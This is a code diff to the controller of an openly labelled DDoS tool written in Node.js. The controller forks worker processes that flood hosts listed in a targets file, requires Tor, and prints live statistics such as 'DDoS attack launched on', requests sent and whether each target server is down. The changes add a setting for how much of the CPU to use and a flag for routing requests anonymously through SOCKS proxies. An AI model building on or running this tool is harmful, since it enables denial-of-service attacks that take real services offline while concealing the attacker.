@@ -8,7 +8,6 @@ import { checkIfTorIsStartedOrExit } from "./utils.mjs";
 
 let configPath, targetsPath;
 
-const startLogMessage = ['DDoS attack launched on', '        ' + new Date().toLocaleString()];
 const configMessages = [];
 
 const startTimestamp = Date.now();
@@ -38,22 +37,26 @@ function verifyUserConfig(userConfig) {
 	if (!isDefined(userConfig.delayBetweenBatch)) {
 		configMessages.push('-- "delayBetweenBatch" not specified in the config.json. Fallback to 0ms.');
 	}
+	if (userConfig.cpuUsageRatio && (userConfig.cpuUsageRatio < 0 || userConfig.cpuUsageRatio > 1)) {
+		throw new Error('cpuUsageRatio must be between 0 and 1.');
+	}
 }
 
-function logStats(cpuCount) {
+function logStats(cpuCount, isUsingAnonymisation) {
 	process.stdout.write('\x1Bc')
 	const elapsedTime = ((Date.now() - startTimestamp) / 1000).toFixed(3);
 	const preparedTableStats = Object.keys(perRequestStats).map(key => {
 		return perRequestStats[key].details;
 	});
 	console.table(preparedTableStats);
-	console.info(...startLogMessage);
+	console.info('DDoS attack launched on        ', new Date().toLocaleString());
 	console.info('Available CPU(s)               ', cpuCount ?? 0);
 	console.info('Worker(s) running              ', Object.keys(cluster.workers).length ?? 0);
 	console.info('Total requests sent            ', Object.values(perRequestStats).reduce((count, data) => {
 		count += Object.values(data)[0].requests;
 		return count;
 	}, 0));
+	console.info('Anonymised requests            ', isUsingAnonymisation ? 'Yes' : 'No');
 	console.info('Time elapsed since launching   ', elapsedTime, 'second(s)');
 	if (configMessages.length) {
 		console.info('User config messages:\n', configMessages.join('\n'));
@@ -66,9 +69,10 @@ function aggregateWorkersStats(workerData) {
 	perRequestStats[key] = perRequestStats[key] || {
 		details: { host, port, path, requests: 0, errors: 0, success: 0 }
 	};
-	perRequestStats[key].details.success += Number(workerData.success);
-	perRequestStats[key].details.errors += Number(workerData.errors);
-	perRequestStats[key].details.requests += Number(workerData.requests);
+	perRequestStats[key].details.success += workerData.success;
+	perRequestStats[key].details.errors += workerData.errors;
+	perRequestStats[key].details.requests += workerData.requests;
+	perRequestStats[key].details.isDown = workerData.isDown ? 'Server down' : 'Server up';
 }
 
 export async function startMaster() {
@@ -86,7 +90,6 @@ export async function startMaster() {
 	console.info('using targets from path', targetsPath);
 	console.info('using config from path', configPath);
 
-	const numCPUs = cpus().length;
 
 	const { data } = await getTargets();
 	const userConfig = await getConfig();
@@ -99,11 +102,12 @@ export async function startMaster() {
 		...(userConfig)
 	};
 
-	for (let i = 0; i < numCPUs; ++i) {
+	const numCPUs = cpus().length;
+	const numCpuToUse = Math.round((userConfig.cpuUsageRatio ?? 1) * numCPUs);
+	for (let i = 0; i < numCpuToUse; ++i) {
 		cluster.fork({
 			USER_CONFIG: JSON.stringify(preparedUserConfig),
-			TARGETS: JSON.stringify(data),
-			CONFIG_MESSAGE: JSON.stringify(configMessages)
+			TARGETS: JSON.stringify(data)
 		});
 	}
 
@@ -117,7 +121,7 @@ export async function startMaster() {
 		cluster.fork({
 			USER_CONFIG: JSON.stringify(preparedUserConfig),
 			TARGETS: JSON.stringify(data),
-			CONFIG_MESSAGE: JSON.stringify(configMessages)
+
 		});
 	});
 
@@ -126,5 +130,6 @@ export async function startMaster() {
 		console.info('DDoS attack stopped on', '        ' + new Date().toLocaleString());
 	});
 
-	statTimer = setInterval(() => logStats(numCPUs), userConfig.logEveryMs);
+	const isUsingAnonymisation = userConfig?.socksProxies?.length;
+	statTimer = setInterval(() => logStats(numCPUs, isUsingAnonymisation), userConfig.logEveryMs);
 }
